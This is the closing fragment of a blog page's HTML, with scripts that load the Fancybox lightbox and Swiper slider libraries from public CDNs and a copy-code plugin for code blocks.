    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
